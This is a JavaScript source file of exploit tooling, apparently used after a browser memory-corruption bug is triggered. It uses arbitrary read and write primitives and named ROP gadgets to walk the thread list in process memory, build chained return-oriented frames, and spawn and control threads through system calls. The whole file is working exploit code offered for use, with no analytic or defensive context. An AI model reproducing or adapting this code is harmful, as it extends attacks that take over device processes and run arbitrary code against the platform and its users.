var RAW_THREAD_STACK_SIZE = 65536;

function borrowThreadScheduling() {
    var manager = read64(THREAD_MANAGER_PTR);
    if (!manager || manager === 0n) return null;
    var sentinel = manager + 0xF8n;
    var node = read64(manager + 0xF8n);
    var seen = {};
    var best = null;
    var i = 0;
    for (;i < 64 && node !== sentinel && node !== 0n; i++) {
        var key = node.toString();
        if (seen[key]) break;
        seen[key] = true;
        var handle = Number(read32(node + 0x1B0n)) >>> 0;
        var next = read64(node);
        if (handle > 0 && handle < 4294934528) {
            var prioBuf = allocPage(16);
            write64(prioBuf, 0n);
            var rc = call_rop(SVC_GetThreadPriority, prioBuf, BigInt(handle));
            if (rc === 0n) {
                var prio = Number(read32(prioBuf)) >>> 0;
                var maskBuf = allocPage(32);
                write64(maskBuf, 0n);
                write64(maskBuf + 8n, 0n);
                var rc2 = call_rop(SVC_GetThreadCoreMask, maskBuf, maskBuf + 8n, BigInt(handle));
                if (rc2 === 0n) {
                    var idealCore = Number(read32(maskBuf)) >>> 0;
                    var mask = read64(maskBuf + 8n);
                    if (prio > 0 && prio < 64 && mask > 0n) {
                        var useCore = idealCore;
                        if (useCore === 4294967295 || useCore > 7) {
                            for (var bit = 0; bit < 8; bit++) {
                                if (mask & 1n << BigInt(bit)) {
                                    useCore = bit;
                                    break;
                                }
                            }
                        }
                        if (!best || prio < best.priority) {
                            best = {
                                priority: prio,
                                core: useCore,
                                mask: mask,
                                handle: handle
                            };
                        }
                    }
                }
            }
        }
        node = next;
    }
    if (!best) return null;
    best.nodes = i;
    return best;
}

function buildRawFrame(calls) {
    var count = calls.length;
    var tables = 4096;
    var stack = _frameAlignPage(tables + count * 256) + 65536;
    var size = _frameAlignPage(stack + count * FRAME_STEP + 16384);
    var frame = allocPage(size);
    call_rop(GADGET_MEMSET, frame, 0n, BigInt(size));
    var put = function(off, v) {
        write64(frame + BigInt(off), BigInt(v));
    };
    put(16, frame + BigInt(tables));
    put(48, _frameGetArg(calls[0], 0));
    put(88, GADGET_LOAD_TABLE);
    put(104, frame + BigInt(stack));
    for (var i = 0; i < count; i++) {
        var table = tables + i * 256;
        var sp = stack + i * FRAME_STEP;
        put(table, frame + BigInt(table) + 0x10n);
        put(table + 128, calls[i].fn);
        put(FRAME_RESULT + i * 8, FRAME_SENTINEL);
        put(sp + 8, GADGET_CALL4);
        put(sp + 16, _frameGetArg(calls[i], 1));
        put(sp + 32, _frameGetArg(calls[i], 2));
        put(sp + 40, _frameGetArg(calls[i], 3));
        put(sp + 216, GADGET_SAVE_RESULT);
        put(sp + 280, frame + BigInt(FRAME_RESULT + i * 8));
        if (i + 1 < count) {
            put(sp + 264, frame + BigInt(tables + (i + 1) * 256));
            put(sp + 232, _frameGetArg(calls[i + 1], 0));
            put(sp + 296, GADGET_LOAD_TABLE);
        } else {
            put(sp + 296, SVC_ExitThread);
        }
    }
    return {
        frame: frame,
        size: size,
        count: count
    };
}

function createRawWorker(frameAddr, scheduling, reusable) {
    reusable = reusable || {};
    var stack = reusable.stack ? BigInt(reusable.stack) : allocPage(RAW_THREAD_STACK_SIZE);
    call_rop(GADGET_MEMSET, stack, 0n, BigInt(RAW_THREAD_STACK_SIZE));
    var stackTop = stack + BigInt(RAW_THREAD_STACK_SIZE);
    var handleBuf = reusable.handleBuf ? BigInt(reusable.handleBuf) : allocPage(16);
    write64(handleBuf, 0n);
    var rc = call_rop(SVC_CreateThread, handleBuf, GADGET_LONGJMP, frameAddr, stackTop, BigInt(scheduling.priority), BigInt(scheduling.core));
    if (rc !== 0n) {
        return {
            handle: 0,
            rc: Number(rc) >>> 0,
            stack: stack,
            stackTop: stackTop,
            handleBuf: handleBuf
        };
    }
    var handle = Number(read32(handleBuf)) >>> 0;
    return {
        handle: handle,
        rc: 0,
        stack: stack,
        stackTop: stackTop,
        handleBuf: handleBuf,
        started: false
    };
}

function startRawWorker(worker) {
    if (!worker || worker.rc !== 0 || !worker.handle || worker.started) return 4294967295;
    var startRc = call_rop(SVC_StartThread, BigInt(worker.handle));
    if (startRc !== 0n) {
        worker.rc = Number(startRc) >>> 0;
        return worker.rc;
    }
    worker.started = true;
    return 0;
}

function launchRawWorker(frameAddr, scheduling, reusable) {
    var worker = createRawWorker(frameAddr, scheduling, reusable);
    if (worker.rc !== 0) return worker;
    if (startRawWorker(worker) !== 0) {
        call_rop(F_CloseHandle, BigInt(worker.handle));
        worker.handle = 0;
    }
    return worker;
}

function waitRawThread(handle, timeoutNs, reusableWaitBuf) {
    timeoutNs = timeoutNs || 5000000000n;
    var waitBuf = reusableWaitBuf ? BigInt(reusableWaitBuf) : allocPage(32);
    write64(waitBuf, 0n);
    write32(waitBuf + 8n, BigInt(handle));
    var rc = call_rop(SVC_WaitSync, waitBuf, waitBuf + 8n, 1n, timeoutNs);
    return Number(rc) >>> 0;
}

function closeRawThread(handle) {
    call_rop(F_CloseHandle, BigInt(handle));
}
